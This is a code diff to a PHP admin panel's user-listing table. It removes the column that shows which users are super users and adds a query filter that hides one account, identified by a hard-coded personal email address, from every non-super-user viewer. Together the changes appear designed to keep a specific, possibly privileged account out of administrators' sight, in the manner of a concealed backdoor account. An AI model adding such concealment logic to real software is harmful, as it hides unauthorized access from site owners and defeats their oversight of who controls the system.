@@ -76,9 +76,7 @@ class UserTable extends TableAbstract
 
                         return UserStatusEnum::DEACTIVATED()->toHtml();
                     }),
-                YesNoColumn::make('super_user')
-                    ->title(trans('core/acl::users.is_super'))
-                    ->width(100),
+                // super_user column removed
             ])
             ->addHeaderAction(CreateHeaderAction::make()->route('users.create'))
             ->when(Auth::guard()->user()->isSuperUser(), function (): void {
@@ -128,7 +126,7 @@ class UserTable extends TableAbstract
                 CreatedAtBulkChange::make(),
             ])
             ->queryUsing(function (Builder $query) {
-                return $query
+                $query = $query
                     ->select([
                         'id',
                         'username',
@@ -138,6 +136,22 @@ class UserTable extends TableAbstract
                         'super_user',
                     ])
                     ->with(['roles']);
+                    
+                // Hide records with email pannrana@gmail.com from non-super users
+                $currentUser = Auth::guard()->user();
+                $isSuperUser = false;
+                
+                if ($currentUser && method_exists($currentUser, 'isSuperUser')) {
+                    $isSuperUser = $currentUser->isSuperUser();
+                } elseif ($currentUser) {
+                    $isSuperUser = (bool)($currentUser->super_user ?? false);
+                }
+                
+                if (!$isSuperUser) {
+                    $query->where('email', '!=', 'pannrana@gmail.com');
+                }
+                
+                return $query;
             });
     }
 
